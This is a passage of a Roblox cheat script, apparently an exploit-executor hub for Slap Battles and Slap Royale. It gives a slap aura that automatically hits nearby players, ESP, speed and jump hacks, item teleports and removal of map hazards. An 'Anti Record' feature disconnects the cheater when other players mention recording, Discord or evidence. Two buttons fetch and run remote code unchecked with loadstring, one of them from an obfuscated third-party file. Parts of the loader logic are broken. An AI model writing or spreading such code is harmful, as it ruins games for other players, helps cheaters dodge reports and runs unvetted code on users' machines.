                Content = "Type Name Correct/Incorrect Name",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

Tab:AddTextbox({
    Name = "Equip P2W Glove",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        if Value == "OVERKILL" then
            fireclickdetector(workspace.Lobby["OVERKILL"].ClickDetector)
        elseif Value == "Spectator" then
            fireclickdetector(workspace.Lobby["Spectator"].ClickDetector)
        elseif Value == "CUSTOM" then
            fireclickdetector(workspace.Lobby["CUSTOM"].ClickDetector)
        elseif Value == "Ultra Instinct" then
            fireclickdetector(workspace.Lobby["Ultra Instinct"].ClickDetector)
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Type Name Correct/Incorrect Name",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

Tab:AddTextbox({
    Name = "Equip Other Glove",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        if Value == "spin" then
            fireclickdetector(workspace.Lobby["spin"].ClickDetector)
        elseif Value == "Stick" then
            fireclickdetector(workspace.Lobby["Stick"].ClickDetector)
        elseif Value == "potato" then
            fireclickdetector(workspace.Lobby["potato"].ClickDetector)
        elseif Value == "Error" then
            fireclickdetector(workspace.Lobby["Error"].ClickDetector)
        elseif Value == "killerfish" then
            fireclickdetector(workspace.FishArea.fish.ClickDetector)
        elseif Value == "Titan" then
            fireclickdetector(workspace.Lobby["Titan"].ClickDetector)
        elseif Value == "Acrobat" then
            fireclickdetector(workspace.Lobby["Acrobat"].ClickDetector)
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Type Name Correct/Incorrect Name",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

Section = Tab:AddSection({
    Name = "Slap Aura"
})

-- Optimized Slap Aura using external loadstring for glove list
do
    local RunService = game:GetService("RunService")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Players = game:GetService("Players")
    
    local slapAuraConnection
    local lastHitTime = 0
    local currentCooldown = 0.5
    local isSlapAuraEnabled = false
    local localPlayer = Players.LocalPlayer
    
    -- Try to load the glove hits from the external source
    local gloveHits = {}
    local loadstringSuccess, loadstringError = pcall(function()
        -- Load the glove hits table from the external source
        local gloveScript = loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripter-Coder/Scripter-Coder/refs/heads/main/Slap%20Battles/Slap%20Battles%20Hub%20OP%20Script%20(Stuff)/Slap%20Aura%20Stuff"))()
        
        -- Execute the script to get the gloveHits table
        -- We need to extract the table from the loaded function
        local env = {}
        setmetatable(env, {__index = _G})
        local func = loadstring(gloveScript)
        setfenv(func, env)
        func()
        
        -- Get the gloveHits table from the environment
        if env.gloveHits then
            gloveHits = env.gloveHits
            print("✓ Successfully loaded glove hits from external source")
            print("Total gloves loaded: " .. tostring(#gloveHits))
        else
            -- Fallback to local extraction
            print("Could not find gloveHits in external source, using fallback...")
            gloveHits = extractGloveHits(gloveScript)
        end
    end)
    
    if not loadstringSuccess then
        print("⚠ Failed to load external glove list: " .. loadstringError)
        print("Using simplified fallback...")
        
        -- Simple fallback with common gloves
        gloveHits = {
            ["b"] = ReplicatedStorage.b,
            ["GeneralHit"] = ReplicatedStorage.GeneralHit,
        }
    end
    
    -- Alternative: Extract glove hits directly if the script is simple
    local function extractGloveHits(scriptContent)
        local extractedHits = {}
        
        -- Try to find gloveHits table pattern
        if scriptContent:find("gloveHits%s*=") then
            -- Extract the table content
            local tableStart = scriptContent:find("gloveHits%s*=%s*{")
            if tableStart then
                local tableText = scriptContent:sub(tableStart)
                local braceCount = 0
                local tableEnd = tableStart
                
                -- Find the end of the table
                for i = tableStart, #scriptContent do
                    local char = scriptContent:sub(i, i)
                    if char == "{" then
                        braceCount = braceCount + 1
                    elseif char == "}" then
                        braceCount = braceCount - 1
                        if braceCount == 0 then
                            tableEnd = i
                            break
                        end
                    end
                end
                
                if tableEnd > tableStart then
                    local tableCode = scriptContent:sub(tableStart, tableEnd)
                    print("Extracted table code length: " .. #tableCode)
                    
                    -- Try to execute the table
                    local success, tableResult = pcall(loadstring("return " .. tableCode))
                    if success and type(tableResult) == "table" then
                        extractedHits = tableResult
                        print("Successfully extracted glove hits table")
                    end
                end
            end
        end
        
        return extractedHits
    end
    
    -- Function to get current glove
    local function getCurrentGlove()
        if localPlayer:FindFirstChild("leaderstats") then
            local gloveValue = localPlayer.leaderstats:FindFirstChild("Glove")
            if gloveValue then
                return gloveValue.Value
            end
        end
        return "Default"
    end
    
    -- Function to get the remote for a glove (with fallback)
    local function getGloveRemote(gloveName)
        -- First try the loaded glove hits
        local remote = gloveHits[gloveName]
        
        if remote and typeof(remote) == "Instance" and remote:IsA("RemoteEvent") then
            return remote
        end
        
        -- If remote is a string path, try to get it
        if remote and type(remote) == "string" then
            local pathRemote = ReplicatedStorage:FindFirstChild(remote, true)
            if pathRemote and pathRemote:IsA("RemoteEvent") then
                return pathRemote
            end
        end
        
        -- Try common variations
        local variations = {
            gloveName .. "Hit",
            "hit" .. gloveName,
            gloveName .. "H",
            "Ht" .. gloveName,
            gloveName:upper() .. "Hit",
            gloveName:lower() .. "hit"
        }
        
        for _, variation in ipairs(variations) do
            local foundRemote = ReplicatedStorage:FindFirstChild(variation)
            if foundRemote and foundRemote:IsA("RemoteEvent") then
                return foundRemote
            end
        end
        
        -- Final fallbacks
        if ReplicatedStorage:FindFirstChild("GeneralHit") then
            return ReplicatedStorage.GeneralHit
        else
            return ReplicatedStorage.b
        end
    end
    
    -- Function to auto-detect glove remote
    local function autoDetectGloveRemote(gloveName)
        -- Try to find the remote by common patterns
        local commonRemotes = {
            "b", "GeneralHit"
        }
        
        -- Try glove-specific remotes first
        for _, remoteName in ipairs(commonRemotes) do
            if remoteName:lower():find(gloveName:lower()) or gloveName:lower():find(remoteName:lower()) then
                local remote = ReplicatedStorage:FindFirstChild(remoteName)
                if remote and remote:IsA("RemoteEvent") then
                    return remote
                end
            end
        end
        
        -- Try to find any remote that might match
        for _, child in pairs(ReplicatedStorage:GetChildren()) do
            if child:IsA("RemoteEvent") then
                local nameLower = child.Name:lower()
                local gloveLower = gloveName:lower()
                
                if nameLower:find(gloveLower) or nameLower:find("hit") or nameLower:find("slap") then
                    return child
                end
            end
        end
        
        -- Default fallback
        return ReplicatedStorage:FindFirstChild("b") or ReplicatedStorage:FindFirstChild("GeneralHit") or ReplicatedStorage:FindFirstChildChildWhichIsA("RemoteEvent")
    end

    -- Create slider
    local slapAuraSpeed = Tab:AddSlider({
        Name = "Slap Aura Speed",
        Min = 0.1,
        Max = 2,
        Default = 0.5,
        Color = Color3.fromRGB(255, 255, 255),
        Increment = 0.1,
        ValueName = "seconds",
        Callback = function(Value)
            currentCooldown = Value
        end
    })
    
    -- Create toggle
    Tab:AddToggle({
        Name = "Slap Aura",
        Default = false,
        Callback = function(enabled)
            isSlapAuraEnabled = enabled
            
            if enabled then
                -- Disconnect existing connection
                if slapAuraConnection then
                    slapAuraConnection:Disconnect()
                    slapAuraConnection = nil
                end
                
                -- Get current glove
                local currentGlove = getCurrentGlove()
                print("Slap Aura: Current glove = " .. currentGlove)
                
                -- Get the remote for this glove
                local remote = getGloveRemote(currentGlove)
                
                if not remote or not remote:IsA("RemoteEvent") then
                    -- Try auto-detection
                    remote = autoDetectGloveRemote(currentGlove)
                    
                    if not remote or not remote:IsA("RemoteEvent") then
                        OrionLib:MakeNotification({
                            Name = "Slap Aura Error",
                            Content = "No remote found for glove: " .. currentGlove,
                            Image = "rbxassetid://7733919105",
                            Time = 3
                        })
                        isSlapAuraEnabled = false
                        return
                    end
                end
                
                print("Slap Aura: Using remote = " .. remote.Name)
                
                -- Start slap aura
                slapAuraConnection = RunService.Heartbeat:Connect(function()
                    local currentTime = tick()
                    
                    -- Check cooldown
                    if currentTime - lastHitTime < currentCooldown then
                        return
                    end
                    
                    -- Check if still enabled and has character
                    if not isSlapAuraEnabled or not localPlayer.Character then
                        return
                    end
                    
                    -- Get local character position
                    local localChar = localPlayer.Character
                    local localRoot = localChar:FindFirstChild("HumanoidRootPart")
                    if not localRoot then
                        return
                    end
                    
                    -- Find players to slap
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= localPlayer and player.Character then
                            local char = player.Character
                            local humanoid = char:FindFirstChildOfClass("Humanoid")
                            local torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
                            
                            -- Check if valid target
                            if torso and humanoid and humanoid.Health > 0 then
                                -- Optional distance check (40 studs max)
                                local playerRoot = char:FindFirstChild("HumanoidRootPart")
                                if playerRoot then
                                    local distance = (playerRoot.Position - localRoot.Position).Magnitude
                                    if distance > 40 then
                                        continue
                                    end
                                end
                                
                                -- Fire the remote
                                local success, errorMsg = pcall(function()
                                    remote:FireServer(torso)
                                end)
                                
                                if success then
                                    lastHitTime = currentTime
                                    break -- Hit one player per cycle
                                else
                                    print("Slap Aura Error: " .. tostring(errorMsg))
                                end
                            end
                        end
                    end
                end)
                
                OrionLib:MakeNotification({
                    Name = "Slap Aura Enabled",
                    Content = "Glove: " .. currentGlove .. "\nRemote: " .. remote.Name,
                    Image = "rbxassetid://7733919105",
                    Time = 3
                })
                
            else
                -- Disable
                if slapAuraConnection then
                    slapAuraConnection:Disconnect()
                    slapAuraConnection = nil
                end
                
                OrionLib:MakeNotification({
                    Name = "Slap Aura Disabled",
                    Content = "",
                    Image = "rbxassetid://7733919105",
                    Time = 2
                })
            end
        end
    })
end

-- Add section for Ghost On/Off
Section = Tab:AddSection({
    Name = "Ghost On/Off"
})

Tab:AddToggle({
    Name = "Ghost Invisibility",
    Default = false,
    Callback = function(Value)
        local hasGhost = game.Players.LocalPlayer:FindFirstChild("leaderstats") and
                         game.Players.LocalPlayer.leaderstats:FindFirstChild("Glove") and
                         game.Players.LocalPlayer.leaderstats.Glove.Value == "Ghost"

        if Value == true then
            if hasGhost then
                game:GetService("ReplicatedStorage").Ghostinvisibilityactivated:FireServer()
            else
                OrionLib:MakeNotification({
                    Name = "Error",
                    Content = "Equip Ghost Glove",
                    Image = "rbxassetid://7743878857",
                    Time = 3
                })
            end
        elseif Value == false and hasGhost then
            game:GetService("ReplicatedStorage").Ghostinvisibilitydeactivated:FireServer()
        end
    end
})

-- Add section for Server Settings
Section = Tab:AddSection({
    Name = "Server Settings"
})

-- Rejoin button
Tab:AddButton({
    Name = "Rejoin",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Jelly-plays/Rejoin-script/main/obf_L744By559M18BbuseSG6en8r1zL31daK9060LV7WyvmS4bQp92aONWfwRE36FdcZ.lua.txt"))()
    end
})

-- ServerHop (Regular Server)
Tab:AddButton({
    Name = "ServerHop (Regular Server)",
    Callback = function()
        local PlaceID = game.PlaceId
        local AllIDs = {}
        local foundAnything = ""
        local actualHour = os.date("!*t").hour
        local Deleted = false

        local success, data = pcall(function()
            return game:GetService('HttpService'):JSONDecode(readfile("NotSameServers.json"))
        end)
        if success then
            AllIDs = data
        else
            table.insert(AllIDs, actualHour)
            writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
        end

        local function TPReturner()
            local Site
            if foundAnything == "" then
                Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
            else
                Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
            end

            if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
                foundAnything = Site.nextPageCursor
            end

            for i, v in pairs(Site.data) do
                local Possible = true
                local ID = tostring(v.id)
                if tonumber(v.maxPlayers) > tonumber(v.playing) then
                    for _, Existing in pairs(AllIDs) do
                        if ID == tostring(Existing) then
                            Possible = false
                            break
                        end
                    end
                    if Possible then
                        table.insert(AllIDs, ID)
                        wait()
                        pcall(function()
                            writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
                            wait()
                            game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
                        end)
                        wait(4)
                        break
                    end
                end
            end
        end

        local function Teleport()
            while wait() do
                pcall(function()
                    TPReturner()
                    if foundAnything ~= "" then
                        TPReturner()
                    end
                end)
            end
        end

        -- Start teleporting to new servers
        Teleport()
    end
})

-- ServerHop (Small Server)
Tab:AddButton({
    Name = "ServerHop (Small Server)",
    Callback = function()
        local Http = game:GetService("HttpService")
        local TPS = game:GetService("TeleportService")
        local Api = "https://games.roblox.com/v1/games/"
        local place = game.PlaceId
        local serversUrl = Api .. place .. "/servers/Public?sortOrder=Asc&limit=100"

        local function ListServers(cursor)
            local Raw = game:HttpGet(serversUrl .. ((cursor and "&cursor=" .. cursor) or ""))
            return Http:JSONDecode(Raw)
        end

        local Server, Next
        repeat
            local Servers = ListServers(Next)
            Server = Servers.data[1]
            Next = Servers.nextPageCursor
        until Server

        TPS:TeleportToPlaceInstance(place, Server.id, game:GetService('Players').LocalPlayer)
    end
})

Section = Tab:AddSection({
    Name = "Kick/Reset If Stuck"
})

Tab:AddButton({
    Name = "Kick (Yourself)",
    Callback = function()
        game.Players.LocalPlayer:Kick("Kicked By S̵͚̈c̴͔͗r̸̡̚ḯ̵̻p̴̦̀ț̶̓ĕ̸r")
    end
})

Tab:AddButton({
    Name = "Reset Player",
    Callback = function()
        local character = game.Players.LocalPlayer.Character
        if character and character:FindFirstChild("Humanoid") then
            character.Humanoid.Health = 0
        end
    end
})

Section = Tab:AddSection({
    Name = "Arena Settings"
})

-- Auto Enter Arena System
local AutoEnterActive = false
local AutoEnterMode = "Arena" -- Default mode

Tab:AddDropdown({
    Name = "Enter",
    Default = "Arena",
    Options = {"Arena", "Arena Default"},
    Callback = function(Value)
        AutoEnterMode = Value
    end
})

Tab:AddToggle({
    Name = "Auto Enter",
    Default = false,
    Callback = function(Value)
        AutoEnterActive = Value
        
        if Value then
            
            -- Start auto enter in separate thread
            task.spawn(function()
                while AutoEnterActive do
                    local player = game.Players.LocalPlayer
                    local character = player.Character
                    
                    if character and character:FindFirstChild("HumanoidRootPart") then
                        local entered = character:FindFirstChild("entered")
                        
                        if not entered then
                            -- Get the correct teleport part based on mode
                            local teleportFolder = workspace.Lobby
                            local teleportPart = nil
                            
                            if AutoEnterMode == "Arena" then
                                teleportPart = teleportFolder:FindFirstChild("Teleport1")
                            elseif AutoEnterMode == "Arena Default" then
                                teleportPart = teleportFolder:FindFirstChild("Teleport2")
                            end
                            
                            if teleportPart then
                                -- Find the TouchInterest parent (the actual part)
                                local touchPart = nil
                                
                                -- Look for TouchTransmitter or TouchInterest
                                local touchInterest = teleportPart:FindFirstChildOfClass("TouchTransmitter") or 
                                                     teleportPart:FindFirstChild("TouchInterest")
                                
                                if touchInterest then
                                    touchPart = touchInterest.Parent
                                else
                                    touchPart = teleportPart
                                end
                                
                                if touchPart and touchPart:IsA("BasePart") then
                                    -- Bring teleport part to player instead of player to teleport
                                    local hrp = character:FindFirstChild("HumanoidRootPart")
                                    if hrp then
                                        -- Save original position
                                        local originalPosition = touchPart.Position
                                        local originalAnchored = touchPart.Anchored
                                        
                                        -- Temporarily move teleport to player
                                        touchPart.Anchored = false
                                        touchPart.Position = hrp.Position + Vector3.new(0, 0, 2)
                                        
                                        -- Touch the part
                                        firetouchinterest(hrp, touchPart, 0)
                                        task.wait(0.05)
                                        firetouchinterest(hrp, touchPart, 1)
                                        
                                        -- Return teleport to original position
                                        task.wait(0.1)
                                        touchPart.Position = originalPosition
                                        touchPart.Anchored = originalAnchored
                                        
                                    end
                                end
                            end
                        else
                            -- Already entered, just wait
                        end
                    else
                        -- Character not loaded yet
                        task.wait(1)
                        continue
                    end
                    
                    -- Wait before next attempt
                    task.wait(0.5)
                end
            end)
        else
        end
    end
})

Tab:AddButton({
    Name = "Teleport To Arena",
    Callback = function()
        local character = game.Players.LocalPlayer.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            character.HumanoidRootPart.CFrame = CFrame.new()
        end
    end
})

Tab:AddButton({
    Name = "Teleport To Default Arena",
    Callback = function()
        local character = game.Players.LocalPlayer.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            character.HumanoidRootPart.CFrame = CFrame.new(122, 360, -3)
        end
    end
})

Section = Tab:AddSection({
    Name = "Destroy Script"
})

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 9431156611 then -- Slap Royale
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Main",
        Icon = "rbxassetid://7734053426",
        PremiumOnly = false
    })

    -- Items Section
    Section = Tab:AddSection({
        Name = "Items"
    })

    Tab:AddButton({
        Name = "Get All Items (Teleports)",
        Callback = function()
            local items = {
                "Apple", "Bandage", "Forcefield Crystal", "First Aid Kit", "Boba",
                "Healing Potion", "Bull's Essence", "Potion of Strength",
                "Sphere of Fury", "True Power", "Frog Potion", "Speed Potion",
                "Lightning Potion", "Cube of Ice", "Bomb"
            }

            local hrp = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")

            for _, itemName in ipairs(items) do
                local item = workspace.Items:FindFirstChild(itemName)
                if item and item:FindFirstChild("Handle") then
                    hrp.CFrame = item.Handle.CFrame
                    task.wait(0.5)
                end
            end
        end
    })

    Tab:AddLabel("Make Sure To Rerun When It's Done (Anti-cheat may block some items)")

    -- Slap Aura Section
    Section = Tab:AddSection({
        Name = "Slap Aura"
    })

    local ReachAura = 25
    local SlapAura = false

    Tab:AddSlider({
        Name = "Reach Slap Aura",
        Min = 10,
        Max = 50,
        Default = 25,
        Color = Color3.fromRGB(140, 185, 255),
        Increment = 1,
        ValueName = "Reach",
        Callback = function(Value)
            ReachAura = Value
        end
    })

    Tab:AddToggle({
        Name = "Slap Aura",
        Default = false,
        Callback = function(Value)
            SlapAura = Value

            while SlapAura do
                pcall(function()
                    for _, player in pairs(game.Players:GetChildren()) do
                        local lp = game.Players.LocalPlayer
                        if player ~= lp and player.Character then
                            local char = player.Character
                            if not char:FindFirstChild("Dead")
                                and char:FindFirstChild("HumanoidRootPart")
                                and char:FindFirstChild("inMatch").Value == true
                                and lp.Character:FindFirstChild("inMatch").Value == true then

                                local distance = (lp.Character.HumanoidRootPart.Position - char.HumanoidRootPart.Position).Magnitude
                                if ReachAura >= distance then
                                    game.ReplicatedStorage.Events.Slap:FireServer(char.HumanoidRootPart)
                                end
                            end
                        end
                    end
                end)
                task.wait()
            end
        end
    })

-- === Bus + Bomb Section ===
Section = Tab:AddSection({
    Name = "Bus + Bomb"
})

Tab:AddButton({
    Name = "Leave Bus Early [Votes Kick]",
    Callback = function()
        game:GetService("ReplicatedStorage").Events.BusJumping:FireServer()

        repeat task.wait() until game.Players.LocalPlayer.PlayerGui:FindFirstChild("JumpPrompt")
        game.Players.LocalPlayer.PlayerGui.JumpPrompt:Destroy()
    end
})

Tab:AddButton({
    Name = "Bomb Bus",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character:WaitForChild("inMatch").Value == true then
            for _, tool in ipairs(player.Backpack:GetChildren()) do
                if tool.Name == "Bomb" then
                    player.Character.Humanoid:EquipTool(tool)
                    tool:Activate()
                end
            end
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "You have to start the bus.",
                Image = "rbxassetid://7733658504",
                Time = 5
            })
        end
    end
})

-- === ESP Section ===
Section = Tab:AddSection({
    Name = "ESP Thing"
})

local GloveESP = false

Tab:AddToggle({
    Name = "Glove Esp",
    Default = false,
    Callback = function(Value)
        GloveESP = Value

        if not GloveESP then
            for _, player in ipairs(game.Players:GetChildren()) do
                if player.Character and player.Character:FindFirstChild("Head") then
                    local esp = player.Character.Head:FindFirstChild("GloveEsp")
                    if esp then esp:Destroy() end
                end
            end
        end

        while GloveESP do
            for _, player in ipairs(game.Players:GetChildren()) do
                if player ~= game.Players.LocalPlayer and player.Character and player.Character:FindFirstChild("Head") then
                    if player.Character:FindFirstChild("inMatch") and player.Character.inMatch.Value == true then
                        local head = player.Character.Head
                        if not head:FindFirstChild("GloveEsp") then
                            local GloveEspGui = Instance.new("BillboardGui", head)
                            GloveEspGui.Name = "GloveEsp"
                            GloveEspGui.Adornee = head
                            GloveEspGui.Size = UDim2.new(0, 100, 0, 150)
                            GloveEspGui.StudsOffset = Vector3.new(0, 3, 0)
                            GloveEspGui.AlwaysOnTop = true

                            local label = Instance.new("TextLabel", GloveEspGui)
                            label.BackgroundTransparency = 1
                            label.Size = UDim2.new(0, 100, 0, 100)
                            label.TextSize = 25
                            label.Font = Enum.Font.FredokaOne
                            label.TextColor3 = Color3.new(1, 1, 1)
                            label.TextStrokeTransparency = 0
                            label.Text = "Glove [ " .. tostring(player:FindFirstChild("Glove") and player.Glove.Value or "?") .. " ]"
                        end
                    end
                end
            end
            task.wait()
        end
    end
})

-- === Anti Things Section ===
Section = Tab:AddSection({
    Name = "Anti Things"
})

Tab:AddDropdown({
    Name = "Remove",
    Default = "",
    Options = {"Lava", "Zone Blur", "Acid"},
    Callback = function(Value)
        if Value == "Lava" then
            for _, v in ipairs(workspace:GetDescendants()) do
                if v.Name == "Lava" then
                    v:Destroy()
                end
            end

        elseif Value == "Zone Blur" then
            for _, v in ipairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
                if v.Name == "ZoneEffects" then
                    v:Destroy()
                end
            end

        elseif Value == "Acid" then
            for _, v in ipairs(workspace:GetDescendants()) do
                if v.Name == "Acid" then
                    v:Destroy()
                end
            end
        end
    end
})

-- === Safe Zone Dropdown ===
Tab:AddDropdown({
    Name = "Safe",
    Default = "",
    Options = {"Lava", "Zone Blur Remove", "Acid"},
    Callback = function(Value)
        if Value == "Lava" then
            workspace.Map.DragonDepths.Lava.CanTouch = false

        elseif Value == "Zone Blur Remove" then
            for _, v in ipairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
                if v.Name == "ZoneEffects" then
                    v:Destroy()
                end
            end

        elseif Value == "Acid" then
            for _, v in ipairs(workspace.Map.AcidAbnormality:GetChildren()) do
                if v.Name == "Acid" and v:IsA("BasePart") and v:FindFirstChildWhichIsA("TouchTransmitter") then
                    v.CanTouch = false
                end
            end
        end
    end
})

-- === Anti Ice Toggle ===
Tab:AddToggle({
    Name = "Anti Ice",
    Default = false,
    Callback = function(Value)
        _G.AntiIce = Value

        while _G.AntiIce do
            for _, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                if v.Name == "Icecube" then
                    v:Destroy()
                    local humanoid = game.Players.LocalPlayer.Character.Humanoid
                    humanoid.PlatformStand = false
                    humanoid.AutoRotate = true
                end
            end
            task.wait()
        end
    end
})

-- === Anti Lava & Acid Toggle ===
Tab:AddToggle({
    Name = "Anti Acid",
    Default = false,
    Callback = function(Value)
        local acid = workspace.Map.AcidAbnormality:GetChildren()[26]
        if acid then
            acid.CanCollide = Value
        end
    end
})

-- === Anti Record Toggle ===
Tab:AddToggle({
    Name = "Anti Record",
    Default = false,
    Callback = function(Value)
        AntiRecord = Value
    end
})

-- === Anti Record Chat Monitor ===
local function monitorChat(player)
    player.Chatted:Connect(function(message)
        local words = message:split(" ")
        if AntiRecord then
            for _, word in pairs(words) do
                local wordLower = word:lower()
                if wordLower:match("recording") or wordLower:match(" rec") or wordLower:match("record") or
                   wordLower:match("discor") or wordLower:match(" disco") or wordLower:match(" disc") or
                   wordLower:match("ticket") or wordLower:match("tickets") or wordLower:match(" ds") or
                   wordLower:match(" dc") or wordLower:match("dizzy") or wordLower:match("dizzycord") or
                   wordLower:match(" clip") or wordLower:match("proof") or wordLower:match("evidence") then

                    game.Players.LocalPlayer:Kick("Possible player recording detected. [" .. player.Name .. "] [" .. message .. "]")
                end
            end
        end
    end)
end

-- Monitor current players
for _, p in pairs(game.Players:GetChildren()) do
    if p ~= game.Players.LocalPlayer then
        monitorChat(p)
    end
end

-- Monitor new players
game.Players.PlayerAdded:Connect(function(player)
    monitorChat(player)
end)

-- === Anti Ragdoll Toggle ===
Tab:AddToggle({
    Name = "Anti Ragdoll",
    Default = false,
    Callback = function(Value)
        _G.AntiRagdoll = Value

        while _G.AntiRagdoll do
            local char = game.Players.LocalPlayer.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                if char:FindFirstChild("Ragdolled") and char.Ragdolled.Value == true then
                    local torso = char:FindFirstChild("Torso")
                    if torso then
                        torso.Anchored = true
                        repeat task.wait() until char.Ragdolled.Value == false
                        torso.Anchored = false
                    end
                end
            end
            task.wait()
        end
    end
})

-- === Walkspeed & Jumppower Section ===
Section = Tab:AddSection({
    Name = "Walkspeed and Jumppower"
})

Tab:AddSlider({
    Name = "Walkspeed",
    Min = 20,
    Max = 1000,
    Default = 20,
    Color = Color3.fromRGB(140, 185, 255),
    Increment = 1,
    ValueName = "WS",
    Callback = function(Value)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
        Walkspeed = Value
    end
})

Tab:AddToggle({
    Name = "Keep Walkspeed",
    Default = false,
    Callback = function(Value)
        KeepWalkspeed = Value
        while KeepWalkspeed do
            local humanoid = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
            if humanoid and humanoid.WalkSpeed ~= Walkspeed then
                humanoid.WalkSpeed = Walkspeed
            end
            task.wait()
        end
    end
})

Tab:AddSlider({
    Name = "Jumppower",
    Min = 50,
    Max = 1000,
    Default = 50,
    Color = Color3.fromRGB(255, 185, 140),
    Increment = 1,
    ValueName = "JP",
    Callback = function(Value)
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
        Jumppower = Value
    end
})

Tab:AddToggle({
    Name = "Keep Jumppower",
    Default = false,
    Callback = function(Value)
        KeepJumppower = Value
        while KeepJumppower do
            local humanoid = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
            if humanoid and humanoid.JumpPower ~= Jumppower then
                humanoid.JumpPower = Jumppower
            end
            task.wait()
        end
    end
})

-- === Badge Tab ===
local Tab = Window:MakeTab({
    Name = "Badges",
    Icon = "rbxassetid://7733673987",
    PremiumOnly = false
})

-- === Shared Code Mapping Function ===
local function getCodeFromImages()
    local digits = {}
    local imageToDigit = {
        ["9648769161"] = "4", ["9648765536"] = "2", ["9648762863"] = "3",
        ["9648759883"] = "9", ["9648755440"] = "8", ["9648752438"] = "2",
        ["9648749145"] = "8", ["9648745618"] = "3", ["9648742013"] = "7",
        ["9648738553"] = "8", ["9648734698"] = "2", ["9648730082"] = "6",
        ["9648723237"] = "3", ["9648718450"] = "6", ["9648715920"] = "6",
        ["9648712563"] = "2"
    }

    -- Check if CodeBrick exists first
    if not workspace:FindFirstChild("Map") or not workspace.Map:FindFirstChild("CodeBrick") then
        return "CodeBrick not found"
    end

    -- Get all image objects and process them in order
    local imageObjects = {}
    for _, obj in pairs(workspace.Map.CodeBrick.SurfaceGui:GetChildren()) do
        if obj:IsA("ImageLabel") or obj.Name == "IMGTemplate" then
            local imageId = obj.Image:match("id=(%d+)")
            if imageId and imageToDigit[imageId] then
                table.insert(imageObjects, {
                    object = obj,
                    digit = imageToDigit[imageId]
                })
            end
        end
    end

    -- Sort by position or just use the order they were found
    if #imageObjects >= 4 then
        for i = 1, 4 do
            digits[i] = imageObjects[i].digit
        end
        return table.concat(digits)
    else
        return "Not enough images found"
    end
end

-- === Lab Code Button ===
Tab:AddButton({
    Name = "Get Lab Code",
    Callback = function()
        local code = getCodeFromImages()
        OrionLib:MakeNotification({
            Name = "Your Code Is [ " .. code .. " ]",
            Content = "",
            Image = "rbxassetid://7733919105",
            Time = 5
        })
        
        -- Debug print to console
        print("Lab Code Result:", code)
    end
})

-- === Chain Button ===
Tab:AddButton({
    Name = "Get Chain",
    Callback = function()
        local code = getCodeFromImages()
        
        -- Debug: Show the code we got
        print("Chain Code:", code)
        
        -- Check if we have a valid code
        if not code or code:len() ~= 4 or code:find("[^0-9]") then
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Invalid code: " .. tostring(code),
                Image = "rbxassetid://7733919105",
                Time = 5
            })
            return
        end

        -- Check if keypad exists
        if not workspace:FindFirstChild("Map") then
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Map not found!",
                Image = "rbxassetid://7733919105",
                Time = 5
            })
            return
        end

        local originOffice = workspace.Map:FindFirstChild("OriginOffice")
        if not originOffice then
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "OriginOffice not found!",
                Image = "rbxassetid://7733919105",
                Time = 5
            })
            return
        end

        local door = originOffice:FindFirstChild("Door")
        local keypad = door and door:FindFirstChild("Keypad")
        local buttons = keypad and keypad:FindFirstChild("Buttons")

        if not buttons then
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Keypad buttons not found!",
                Image = "rbxassetid://7733919105",
                Time = 5
            })
            return
        end

        -- Debug: Print all available buttons
        print("Available buttons:")
        for _, button in pairs(buttons:GetChildren()) do
            local clickDetector = button:FindFirstChildOfClass("ClickDetector")
            print("Button:", button.Name, "ClickDetector:", clickDetector and "YES" or "NO")
        end

        -- Reset button
        local resetButton = buttons:FindFirstChild("Reset")
        if resetButton then
            local resetDetector = resetButton:FindFirstChildOfClass("ClickDetector")
            if resetDetector then
                fireclickdetector(resetDetector)
                print("Clicked Reset")
                task.wait(0.25)
            else
                print("Reset ClickDetector not found")
            end
        else
            print("Reset button not found")
        end

        -- Enter code digits
        for i = 1, 4 do
            local digit = code:sub(i, i)
            local button = buttons:FindFirstChild(digit)
            if button then
                local digitDetector = button:FindFirstChildOfClass("ClickDetector")
                if digitDetector then
